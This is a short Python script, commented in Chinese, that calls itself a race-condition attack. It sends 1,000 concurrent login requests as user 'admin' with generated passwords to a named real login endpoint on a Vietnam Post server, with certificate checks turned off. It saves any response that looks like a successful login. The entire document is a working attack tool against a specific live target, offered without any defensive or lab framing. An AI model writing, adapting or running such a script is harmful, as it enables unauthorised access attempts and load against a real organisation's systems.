#!/usr/bin/env python3
# 竞态条件攻击 - 并发1000个登录请求

import requests
import threading
import urllib3
urllib3.disable_warnings()

TARGET = "https://vps.vnpost.vn/cgi-bin/MANGA/index.cgi"
THREADS = 100
REQUESTS_PER_THREAD = 10

def attack_thread(thread_id):
    session = requests.Session()
    for i in range(REQUESTS_PER_THREAD):
        try:
            data = {
                'func': 'login',
                'username': 'admin',
                'password': f'test{thread_id}{i}'
            }
            resp = session.post(TARGET, data=data, verify=False, timeout=10)
            
            # 检查异常响应
            if 'login_box' not in resp.text and len(resp.text) > 1000:
                print(f"[!] 线程{thread_id}-{i}: 异常响应长度={len(resp.text)}")
                with open(f'/tmp/race_success_{thread_id}_{i}.html', 'w') as f:
                    f.write(resp.text)
        except Exception as e:
            pass

print(f"[*] 启动{THREADS}个线程，共{THREADS*REQUESTS_PER_THREAD}个并发请求...")

threads = []
for i in range(THREADS):
    t = threading.Thread(target=attack_thread, args=(i,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("[*] 竞态攻击完成")
